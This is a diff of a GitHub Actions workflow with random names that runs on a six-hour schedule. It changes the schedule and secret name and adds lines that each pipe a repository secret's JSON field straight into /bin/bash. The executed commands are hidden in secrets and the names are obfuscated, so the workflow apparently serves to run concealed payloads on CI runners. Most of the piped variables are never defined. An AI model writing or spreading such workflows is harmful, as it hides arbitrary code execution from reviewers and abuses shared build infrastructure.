@@ -1,26 +1,28 @@
 name: mingyulu1837
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '50 3/6 * * *'
+    - cron: '26 2/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: mingyulu1837
         env:
-          cssah2: ${{ secrets.cssah2 }}
+          n2: ${{ secrets.n2 }}
         run: |
-          echo $cssah2 | jq -r .ifep41978 | /bin/bash
-          echo $en585 | jq -r .b76338 | /bin/bash
-          echo $uacwb135 | jq -r .ecixa7930 | /bin/bash
-          echo $iavb2 | jq -r .jws31 | /bin/bash
-          echo $lebn4 | jq -r .lrd050 | /bin/bash
-          echo $oniq08357 | jq -r .gm2807 | /bin/bash
-          echo $cbe22555 | jq -r .edww056 | /bin/bash
-          echo $tcxab77 | jq -r .wek965 | /bin/bash
-          echo $eqg4 | jq -r .yoqh951 | /bin/bash
+          echo $n2 | jq -r .jp87419 | /bin/bash
+          echo $mtkx52691 | jq -r .nop5001 | /bin/bash
+          echo $qwvun3 | jq -r .wt64 | /bin/bash
+          echo $ei9969 | jq -r .dgcsq1464 | /bin/bash
+          echo $k3635 | jq -r .vtoyt75 | /bin/bash
+          echo $uyyd83 | jq -r .drhlz3266 | /bin/bash
+          echo $piz3998 | jq -r .nqv2 | /bin/bash
+          echo $nu7901 | jq -r .qhg73892 | /bin/bash
+          echo $jeqc69 | jq -r .cgw4 | /bin/bash
+          echo $z1 | jq -r .i462 | /bin/bash
+          echo $f35 | jq -r .u5 | /bin/bash
 
